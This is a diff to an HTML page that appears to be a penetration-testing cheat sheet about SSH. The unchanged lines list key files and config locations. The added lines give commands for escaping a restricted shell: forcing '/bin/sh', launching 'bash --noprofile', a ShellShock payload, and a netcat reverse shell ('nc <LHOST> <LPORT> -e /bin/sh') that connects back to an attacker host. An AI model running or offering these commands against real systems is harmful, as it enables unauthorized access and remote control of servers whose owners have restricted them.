@@ -12,4 +12,17 @@ id_&lt;ALGORITHM&gt;.pub (ie, id_rsa.pub, id_dsa.pub, etc): ssh public key<br/>
 <br/>
 <br/>
 Check /etc/ssh/sshd_config for interesting locations (ie auth_keys location)<br/>
-Check /etc/ssh/ssh_config for other options</body></html>
+Check /etc/ssh/ssh_config for other options<br/>
+<br/>
+<br/>
+use SSH on your machine to execute commands before the shell is loaded:<br/>
+&nbsp;ssh user@server -t "/bin/sh"<br/>
+<br/>
+or start the shell without loading "rc" profice (where most limits are configured):<br/>
+&nbsp;ssh user@server -t "bash --noprofile"<br/>
+<br/>
+try ShellShock on vulnerable implementations<br/>
+&nbsp;ssh user@server -t "() { :; }; /bin/bash"<br/>
+<br/>
+try to execute other commands such as nc to get full shell<br/>
+&nbsp;ssh user@server nc &lt;LHOST&gt; &lt;LPORT&gt; -e /bin/sh</body></html>
